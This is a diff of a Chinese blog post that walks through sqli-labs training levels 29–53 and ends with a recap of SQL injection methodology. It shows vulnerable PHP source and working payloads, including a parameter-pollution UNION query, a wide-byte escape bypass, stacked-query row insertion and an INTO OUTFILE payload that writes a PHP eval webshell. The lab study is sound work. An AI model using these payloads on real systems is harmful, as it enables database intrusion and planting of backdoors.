@@ -88,10 +88,14 @@
                 </header>
 
                 
+                    <div class="al_page_content_outline">
+                        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#29%E5%85%B3"><span class="toc-text">29关</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC32%E5%85%B3"><span class="toc-text">第32关</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC34%E5%85%B3"><span class="toc-text">第34关</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#35%E5%85%B3"><span class="toc-text">35关</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#38%E5%85%B3"><span class="toc-text">38关</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#42%E5%85%B3"><span class="toc-text">42关</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#46%E5%85%B3"><span class="toc-text">46关</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%94%E5%8D%81%E5%85%B3"><span class="toc-text">五十关</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A4%8D%E4%B9%A0%E4%B8%8Bsql%E6%B3%A8%E5%85%A5%E5%9F%BA%E6%9C%AC%E6%B5%81%E7%A8%8B%EF%BC%9A"><span class="toc-text">复习下sql注入基本流程：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%93%E5%B0%BE"><span class="toc-text">结尾</span></a></li></ol>
+                    </div>
+                
 
                 
                 <section id="post-body">
-                    <p><strong>29关</strong><br>看看源代码：</p>
+                    <h2 id="29关"><a href="#29关" class="headerlink" title="29关"></a>29关</h2><p>看看源代码：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">function whitelist($input)</span><br><span class="line">&#123;</span><br><span class="line">	$match = preg_match(&quot;/^\d+$/&quot;, $input);</span><br><span class="line">	if($match)</span><br><span class="line">	&#123;</span><br><span class="line">		//echo &quot;you are good&quot;;</span><br><span class="line">		//return $match;</span><br><span class="line">	&#125;</span><br><span class="line">	else</span><br><span class="line">	&#123;	</span><br><span class="line">		header(&#x27;Location: hacked.php&#x27;);</span><br><span class="line">		//echo &quot;you are bad&quot;;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">// The function below immitates the behavior of parameters when subject to HPP (HTTP Parameter Pollution).</span><br><span class="line">function java_implimentation($query_string)</span><br><span class="line">&#123;</span><br><span class="line">	$q_s = $query_string;</span><br><span class="line">	$qs_array= explode(&quot;&amp;&quot;,$q_s);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	foreach($qs_array as $key =&gt; $value)</span><br><span class="line">	&#123;</span><br><span class="line">		$val=substr($value,0,2);</span><br><span class="line">		if($val==&quot;id&quot;)</span><br><span class="line">		&#123;</span><br><span class="line">			$id_value=substr($value,3,30); </span><br><span class="line">			return $id_value;</span><br><span class="line">			echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">			break;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>首先是<code>preg_match</code>：字符串的规则匹配。如果找到一个匹配，preg_match() 函数返回 1，否则返回 0。</p>
 <p><code>\d+ 表示可以出现1次或是n次数字</code></p>
@@ -111,7 +115,7 @@
 <p>比如这样</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&amp;id=0&#x27;union select 1,database(),3 --+</span><br></pre></td></tr></table></figure>
 <hr>
-<p><strong>第32关</strong><br>源代码：</p>
+<h2 id="第32关"><a href="#第32关" class="headerlink" title="第32关"></a>第32关</h2><p>源代码：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">function check_addslashes($string)</span><br><span class="line">&#123;</span><br><span class="line">    $string = preg_replace(&#x27;/&#x27;. preg_quote(&#x27;\\&#x27;) .&#x27;/&#x27;, &quot;\\\\\\&quot;, $string);          //escape any backslash</span><br><span class="line">    $string = preg_replace(&#x27;/\&#x27;/i&#x27;, &#x27;\\\&#x27;&#x27;, $string);                               //escape single quote with a backslash</span><br><span class="line">    $string = preg_replace(&#x27;/\&quot;/&#x27;, &quot;\\\&quot;&quot;, $string);                                //escape double quote with a backslash</span><br><span class="line">      </span><br><span class="line">    </span><br><span class="line">    return $string;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>它将 ‘ 转为 &#39; ， 将 \ 转为 \ ，将 “ 转为 &quot;</p>
 <p>还有</p>
@@ -128,7 +132,7 @@
 <p>注意在查询后面时，会遇到’security’也有单引号<br>我们要把security进行16进制转化后，加上0x来代替。</p>
 <p><strong>33关</strong>同理，只是用addslashes()函数进行过滤操作<br><strong>36关</strong>同理，只是用mysql_real_escape_string()函数进行过滤</p>
 <hr>
-<p><strong>第34关</strong><br>也是过滤了前几关的东西，不过变成post形势</p>
+<h2 id="第34关"><a href="#第34关" class="headerlink" title="第34关"></a>第34关</h2><p>也是过滤了前几关的东西，不过变成post形势</p>
 <p>我们前几关是get型，get型的方式我们是以url形式提交的，我们通过单引号url解码后变成%5c%27的形势，加上个%aa让%aa%5c形成整体来绕过。</p>
 <p>这关我们还是一样输入</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%aa&#x27; union select 1,2#</span><br></pre></td></tr></table></figure>
@@ -138,9 +142,9 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">�&#x27; union select 1,2#</span><br></pre></td></tr></table></figure>
 <p>即可。<br><strong>37关</strong>同理<br>只是用mysql_real_escape_string()函数过滤</p>
 <hr>
-<p><strong>35关</strong><br>过滤了单引号<br>不过后来发现根本不需要单引号<br><code>$sql=&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;;</code></p>
+<h2 id="35关"><a href="#35关" class="headerlink" title="35关"></a>35关</h2><p>过滤了单引号<br>不过后来发现根本不需要单引号<br><code>$sql=&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;;</code></p>
 <hr>
-<p><strong>38关</strong><br>先看看原代码：</p>
+<h2 id="38关"><a href="#38关" class="headerlink" title="38关"></a>38关</h2><p>先看看原代码：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$con1 = mysqli_connect($host,$dbuser,$dbpass,$dbname);</span><br></pre></td></tr></table></figure>
 <p>定义和用法<br>mysqli_connect() 函数打开一个到 MySQL 服务器的新的连接。</p>
 <p>语法<br>mysqli_connect(host,username,password,dbname,port,socket);</p>
@@ -189,10 +193,10 @@
 <p>把注释号用；就行</p>
 <p><strong>39关</strong>同理，无闭合<br><strong>40关</strong>同理，闭合为’)<br><strong>41关</strong>同理，和39一样，只是无回显</p>
 <hr>
-<p><strong>42关</strong><br>username被过滤<br>在password中考虑注入<br>同样用堆叠注入</p>
+<h2 id="42关"><a href="#42关" class="headerlink" title="42关"></a>42关</h2><p>username被过滤<br>在password中考虑注入<br>同样用堆叠注入</p>
 <p><strong>42关</strong>是单引号字符型注入，<strong>43关</strong>是单引号括号注入，<strong>44关</strong>是单引号盲注，<strong>45关</strong>是单引号括号盲注</p>
 <hr>
-<p><strong>46关</strong><br>从本关开始，我们开始学习<strong>order by 相关注入</strong>的知识。</p>
+<h2 id="46关"><a href="#46关" class="headerlink" title="46关"></a>46关</h2><p>从本关开始，我们开始学习<strong>order by 相关注入</strong>的知识。</p>
 <p>我们发现在源代码中出现了一个和以前都不一样的东西</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql = &quot;SELECT * FROM users ORDER BY $id&quot;;</span><br></pre></td></tr></table></figure>
 <p>从上述的sql语句中我们可以看出，我们的注入点在order by后面的参数中，而order by不同于的我们在where后的注入点，不能使用union等进行注入</p>
@@ -205,11 +209,28 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort=1 and &quot;&lt;?php @eval($_POST[cmd]);?&gt;&quot; into outfile &#x27;D:/phpstudy_pro/WWW/sqli/sqli/Less-46/123.php&#x27;</span><br></pre></td></tr></table></figure>
 <p><strong>46关</strong>是数字型注入，<strong>47关</strong>是单引号字符型注入，<strong>48关</strong>是数字型盲注，<strong>49关</strong>是单引号字符型盲注。</p>
 <hr>
-<p><strong>五十关</strong><br>也是order by注入 和前几关差不多<br>只是多了mysqli_multi_query()函数<br>我们不仅可以用前几关的方法，同时还能用堆叠注入。<br>语句差不多</p>
+<h2 id="五十关"><a href="#五十关" class="headerlink" title="五十关"></a>五十关</h2><p>也是order by注入 和前几关差不多<br>只是多了mysqli_multi_query()函数<br>我们不仅可以用前几关的方法，同时还能用堆叠注入。<br>语句差不多</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort=1;insert%20into%20users(id,username,password)values(99,%27123%27,%27456%27)</span><br></pre></td></tr></table></figure>
 <p><strong>50关</strong>是数字型注入，<strong>51关</strong>是单引号字符型注入，<strong>52关</strong>是数字型盲注，<strong>53关</strong>是单引号字符型盲注。</p>
 <hr>
-<p>至此，sqllab前三章结束。</p>
+<p>sqllab前三章结束。</p>
+<h2 id="复习下sql注入基本流程："><a href="#复习下sql注入基本流程：" class="headerlink" title="复习下sql注入基本流程："></a>复习下sql注入基本流程：</h2><ul>
+<li>获取什么数据id还是flag还是sort</li>
+<li>找闭合（单引号双引号括号混合）<br>ps：有可能没有，上次极客大挑战就是，找了半天，最后发现没有…</li>
+<li>寻找合适语句<br>联合注入（有回显）<br>报错注入（有报错）<br>时间布尔盲注<br>order by注入<br>堆叠注入</li>
+<li>有过滤，针对不同的过滤有不同的绕过，组成最终payload</li>
+</ul>
+<p>还有些特殊的</p>
+<ul>
+<li>二阶注入</li>
+<li>双网址</li>
+<li>uagent或Referer或cookie注入</li>
+<li>万能语句</li>
+<li>有无waf</li>
+<li>注入一句话木马</li>
+</ul>
+<hr>
+<h2 id="结尾"><a href="#结尾" class="headerlink" title="结尾"></a>结尾</h2><p>至此，sqlilab靶场告一段落。<br>刚开始做这个靶场的时候，确确实实的感觉到很茫然，<br>常常一个知识点要搜索好多篇文章，才有可能有点头绪，<br>幸好这一过程不算痛苦，甚至有些有趣，<br>也许是因为对未知领域的探索与对未来的期待。<br>在刷这个靶场的过程中，感谢某位大佬写的MYSQL天书给了我不少启发，<br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/lcamry/category/846064.html">https://www.cnblogs.com/lcamry/category/846064.html</a><br>还有几位优秀学长的博客让我找到一些方向。<br>我知道这个靶场只是基础，未来遇到的题目将会比这难的多，<br>继续加油吧。</p>
 
                 </section>
 
